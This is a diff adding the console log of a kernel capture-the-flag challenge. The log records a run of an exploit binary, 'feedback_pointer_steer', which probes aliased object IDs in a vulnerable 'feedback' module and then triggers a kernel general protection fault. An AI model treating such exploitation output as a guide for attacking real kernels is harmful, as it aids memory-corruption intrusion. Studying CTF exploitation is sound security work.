@@ -1,0 +1,173 @@
+c[?7l[2J[0mSeaBIOS (version rel-1.17.0-0-gb52ca86e094d-prebuilt.qemu.org)
+
+
+iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+3EFD1C90+3EF31C90 CA00
+Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               
+
+
+Booting from ROM..c[?7l[2JSaving 256 bits of non-creditable seed for next boot
+Starting syslogd: OK
+Starting klogd: OK
+Running sysctl: OK
+Starting network: OK
+Starting crond: OK
+
+-----------------------------
+
+Welcome to Student Feedback
+-----------------------------
+
+~ $ /bin/feedback_pointer_steer
+[+] collecting broken IDs
+[+] broken_n=71
+[+] alias probing around broken IDs (delta -0x200..+0x200)
+ALIAS broken=14680064 -> qid=14680065 delta=1 marker=0x41
+ALIAS broken=14680064 -> qid=14680066 delta=2 marker=0x42
+ALIAS broken=14680064 -> qid=14680068 delta=4 marker=0x44
+ALIAS broken=14680064 -> qid=14680069 delta=5 marker=0x45
+ALIAS broken=14680067 -> qid=14680065 delta=-2 marker=0x41
+ALIAS broken=14680067 -> qid=14680066 delta=-1 marker=0x42
+ALIAS broken=14680067 -> qid=14680068 delta=1 marker=0x44
+ALIAS broken=14680067 -> qid=14680069 delta=2 marker=0x45
+ALIAS broken=14680070 -> qid=14680065 delta=-5 marker=0x41
+ALIAS broken=14680070 -> qid=14680066 delta=-4 marker=0x42
+ALIAS broken=14680070 -> qid=14680068 delta=-2 marker=0x44
+ALIAS broken=14680070 -> qid=14680069 delta=-1 marker=0x45
+ALIAS broken=14680073 -> qid=14680065 delta=-8 marker=0x41
+ALIAS broken=14680073 -> qid=14680066 delta=-7 marker=0x42
+ALIAS broken=14680073 -> qid=14680068 delta=-5 marker=0x44
+ALIAS broken=14680073 -> qid=14680069 delta=-4 marker=0x45
+ALIAS broken=14680075 -> qid=14680065 delta=-10 marker=0x41
+ALIAS broken=14680075 -> qid=14680066 delta=-9 marker=0x42
+ALIAS broken=14680075 -> qid=14680068 delta=-7 marker=0x44
+ALIAS broken=14680075 -> qid=14680069 delta=-6 marker=0x45
+ALIAS broken=14680076 -> qid=14680065 delta=-11 marker=0x41
+ALIAS broken=14680076 -> qid=14680066 delta=-10 marker=0x42
+ALIAS broken=14680076 -> qid=14680068 delta=-8 marker=0x44
+ALIAS broken=14680076 -> qid=14680069 delta=-7 marker=0x45
+ALIAS broken=14680079 -> qid=14680065 delta=-14 marker=0x41
+ALIAS broken=14680079 -> qid=14680066 delta=-13 marker=0x42
+ALIAS broken=14680079 -> qid=14680068 delta=-11 marker=0x44
+ALIAS broken=14680079 -> qid=14680069 delta=-10 marker=0x45
+ALIAS broken=14680082 -> qid=14680065 delta=-17 marker=0x41
+ALIAS broken=14680082 -> qid=14680066 delta=-16 marker=0x42
+ALIAS broken=14680082 -> qid=14680068 delta=-14 marker=0x44
+ALIAS broken=14680082 -> qid=14680069 delta=-13 marker=0x45
+ALIAS broken=14680085 -> qid=14680065 delta=-20 marker=0x41
+ALIAS broken=14680085 -> qid=14680066 delta=-19 marker=0x42
+ALIAS broken=14680085 -> qid=14680068 delta=-17 marker=0x44
+ALIAS broken=14680085 -> qid=14680069 delta=-16 marker=0x45
+ALIAS broken=14680086 -> qid=14680065 delta=-21 marker=0x41
+ALIAS broken=14680086 -> qid=14680066 delta=-20 marker=0x42
+ALIAS broken=14680086 -> qid=14680068 delta=-18 marker=0x44
+ALIAS broken=14680086 -> qid=14680069 delta=-17 marker=0x45
+ALIAS broken=14680088 -> qid=14680065 delta=-23 marker=0x41
+ALIAS broken=14680088 -> qid=14680066 delta=-22 marker=0x42
+ALIAS broken=14680088 -> qid=14680068 delta=-20 marker=0x44
+ALIAS broken=14680088 -> qid=14680069 delta=-19 marker=0x45
+ALIAS broken=14680091 -> qid=14680065 delta=-26 marker=0x41
+ALIAS broken=14680091 -> qid=14680066 delta=-25 marker=0x42
+ALIAS broken=14680091 -> qid=14680068 delta=-23 marker=0x44
+ALIAS broken=14680091 -> qid=14680069 delta=-22 marker=0x45
+ALIAS broken=14680094 -> qid=14680065 delta=-29 marker=0x41
+ALIAS broken=14680094 -> qid=14680066 delta=-28 marker=0x42
+ALIAS broken=14680094 -> qid=14680068 delta=-26 marker=0x44
+ALIAS broken=14680094 -> qid=14680069 delta=-25 marker=0x45
+ALIAS broken=14680097 -> qid=14680065 delta=-32 marker=0x41
+ALIAS broken=14680097 -> qid=14680066 delta=-31 marker=0x42
+ALIAS broken=14680097 -> qid=14680068 delta=-29 marker=0x44
+ALIAS broken=14680097 -> qid=14680069 delta=-28 marker=0x45
+ALIAS broken=14680100 -> qid=14680065 delta=-35 marker=0x41
+ALIAS broken=14680100 -> qid=14680066 delta=-34 marker=0x42
+ALIAS broken=14680100 -> qid=14680068 delta=-32 marker=0x44
+ALIAS broken=14680100 -> qid=14680069 delta=-31 marker=0x45
+ALIAS broken=14680103 -> qid=14680065 delta=-38 marker=0x41
+ALIAS broken=14680103 -> qid=14680066 delta=-37 marker=0x42
+ALIAS broken=14680103 -> qid=14680068 delta=-35 marker=0x44
+ALIAS broken=14680103 -> qid=14680069 delta=-34 marker=0x45
+ALIAS broken=14680106 -> qid=14680065 delta=-41 marker=0x41
+ALIAS broken=14680106 -> qid=14680066 delta=-40 marker=0x42
+ALIAS broken=14680106 -> qid=14680068 delta=-38 marker=0x44
+ALIAS broken=14680106 -> qid=14680069 delta=-37 marker=0x45
+ALIAS broken=14680108 -> qid=14680065 delta=-43 marker=0x41
+ALIAS broken=14680108 -> qid=14680066 delta=-42 marker=0x42
+ALIAS broken=14680108 -> qid=14680068 delta=-40 marker=0x44
+ALIAS broken=14680108 -> qid=14680069 delta=-39 marker=0x45
+ALIAS broken=14680109 -> qid=14680065 delta=-44 marker=0x41
+ALIAS broken=14680109 -> qid=14680066 delta=-43 marker=0x42
+ALIAS broken=14680109 -> qid=14680068 delta=-41 marker=0x44
+ALIAS broken=14680109 -> qid=14680069 delta=-40 marker=0x45
+ALIAS broken=14680112 -> qid=14680065 delta=-47 marker=0x41
+ALIAS broken=14680112 -> qid=14680066 delta=-46 marker=0x42
+ALIAS broken=14680112 -> qid=14680068 delta=-44 marker=0x44
+ALIAS broken=14680112 -> qid=14680069 delta=-43 marker=0x45
+ALIAS broken=14680115 -> qid=14680065 delta=-50 marker=0x41
+ALIAS broken=14680115 -> qid=14680066 delta=-49 marker=0x42
+ALIAS broken=14680115 -> qid=14680068 delta=-47 marker=0x44
+ALIAS broken=14680115 -> qid=14680069 delta=-46 marker=0x45
+ALIAS broken=14680118 -> qid=14680065 delta=-53 marker=0x41
+ALIAS broken=14680118 -> qid=14680066 delta=-52 marker=0x42
+ALIAS broken=14680118 -> qid=14680068 delta=-50 marker=0x44
+ALIAS broken=14680118 -> qid=14680069 delta=-49 marker=0x45
+ALIAS broken=14680119 -> qid=14680065 delta=-54 marker=0x41
+ALIAS broken=14680119 -> qid=14680066 delta=-53 marker=0x42
+ALIAS broken=14680119 -> qid=14680068 delta=-51 marker=0x44
+ALIAS broken=14680119 -> qid=14680069 delta=-50 marker=0x45
+ALIAS broken=14680121 -> qid=14680065 delta=-56 marker=0x41
+ALIAS broken=14680121 -> qid=14680066 delta=-55 marker=0x42
+ALIAS broken=14680121 -> qid=14680068 delta=-53 marker=0x44
+ALIAS broken=14680121 -> qid=14680069 delta=-52 marker=0x45
+[+] alias_hits=96
+~ $ exit
+[    6.177544] Oops: general protection fault, probably for non-canonical address 0x1770f00000000000: 0000 [#1] SMP NOPTI
+[    6.179164] CPU: 2 UID: 0 PID: 120 Comm: S99ctf Tainted: G           O        6.19.3 #1 PREEMPT(voluntary) 
+[    6.179812] Tainted: [O]=OOT_MODULE
+[    6.179994] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.17.0-0-gb52ca86e094d-prebuilt.qemu.org 04/01/2014
+[    6.180576] RIP: 0010:rwsem_down_write_slowpath+0xbc/0x5f0
+[    6.181323] Code: 24 50 e8 67 3b 00 00 49 8d 47 18 48 89 c6 48 89 44 24 10 49 8b 47 20 48 8d 4c 24 30 49 89 4f 20 48 89 74 24 30 48 89 44 24 38 <48> 89 08 49 39 4f 18 0f 84 d1 03 00 00 49 8b 07 a8 01 75 1e be 01
+[    6.182191] RSP: 0018:ffffaaa0c034bbb0 EFLAGS: 00010046
+[    6.182494] RAX: 1770f00000000000 RBX: ffff974e41f35880 RCX: ffffaaa0c034bbe0
+[    6.182826] RDX: 0000000000000001 RSI: ffff974e431770e3 RDI: ffff974e431770df
+[    6.183166] RBP: ffffaaa0c034bc48 R08: 0000000000003c47 R09: ffffffffbd686b6f
+[    6.183537] R10: 00007f4e0e908000 R11: ffff974e431f27f0 R12: ffff974e431770df
+[    6.183911] R13: 0000000000000002 R14: ffff974e4303ee70 R15: ffff974e431770cb
+[    6.184565] FS:  00007f4e0e6c5740(0000) GS:ffff974ebedce000(0000) knlGS:0000000000000000
+[    6.184714] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[    6.184812] CR2: 00007f4e0e8a5b20 CR3: 0000000001bf8000 CR4: 00000000003006f0
+[    6.185407] Call Trace:
+[    6.186418]  <TASK>
+[    6.186903]  down_write+0x55/0x60
+[    6.187240]  anon_vma_clone+0x8d/0x1c0
+[    6.187471]  ? kmem_cache_alloc_noprof+0x20c/0x460
+[    6.187771]  anon_vma_fork+0x28/0x140
+[    6.188086]  dup_mmap+0x4ed/0x720
+[    6.188375]  copy_process+0x104c/0x1ac0
+[    6.188626]  kernel_clone+0xb9/0x400
+[    6.188860]  __do_sys_clone+0x65/0x90
+[    6.189066]  do_syscall_64+0xa4/0x320
+[    6.189260]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[    6.189785] RIP: 0033:0x7f4e0e7a1ae6
+[    6.190176] Code: 89 df e8 0d 6f f6 ff 45 31 c0 31 d2 31 f6 64 48 8b 04 25 10 00 00 00 bf 11 00 20 01 4c 8d 90 d0 02 00 00 b8 38 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 52 89 c5 85 c0 75 31 64 48 8b 04 25 10 00 00
+[    6.191052] RSP: 002b:00007ffd958c8a80 EFLAGS: 00000246 ORIG_RAX: 0000000000000038
+[    6.191481] RAX: ffffffffffffffda RBX: 00007ffd958c8a88 RCX: 00007f4e0e7a1ae6
+[    6.191855] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000001200011
+[    6.192263] RBP: 0000560818ef8860 R08: 0000000000000000 R09: feff736d746e6c74
+[    6.192888] R10: 00007f4e0e6c5a10 R11: 0000000000000246 R12: 0000560818ef86a8
+[    6.193215] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
+[    6.194642]  </TASK>
+[    6.194875] Modules linked in: feedback(O)
+[    6.195687] ---[ end trace 0000000000000000 ]---
+[    6.196297] RIP: 0010:rwsem_down_write_slowpath+0xbc/0x5f0
+[    6.196601] Code: 24 50 e8 67 3b 00 00 49 8d 47 18 48 89 c6 48 89 44 24 10 49 8b 47 20 48 8d 4c 24 30 49 89 4f 20 48 89 74 24 30 48 89 44 24 38 <48> 89 08 49 39 4f 18 0f 84 d1 03 00 00 49 8b 07 a8 01 75 1e be 01
+[    6.197356] RSP: 0018:ffffaaa0c034bbb0 EFLAGS: 00010046
+[    6.197750] RAX: 1770f00000000000 RBX: ffff974e41f35880 RCX: ffffaaa0c034bbe0
+[    6.200966] RDX: 0000000000000001 RSI: ffff974e431770e3 RDI: ffff974e431770df
+[    6.201352] RBP: ffffaaa0c034bc48 R08: 0000000000003c47 R09: ffffffffbd686b6f
+[    6.201678] R10: 00007f4e0e908000 R11: ffff974e431f27f0 R12: ffff974e431770df
+[    6.201981] R13: 0000000000000002 R14: ffff974e4303ee70 R15: ffff974e431770cb
+[    6.202328] FS:  00007f4e0e6c5740(0000) GS:ffff974ebedce000(0000) knlGS:0000000000000000
+[    6.202734] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[    6.203022] CR2: 00007f4e0e8a5b20 CR3: 0000000001bf8000 CR4: 00000000003006f0
+[    6.203429] note: S99ctf[120] exited with irqs disabled
+[    6.203969] note: S99ctf[120] exited with preempt_count 2
+qemu-system-x86_64: terminating on signal 2 from pid 732 (<unknown process>)
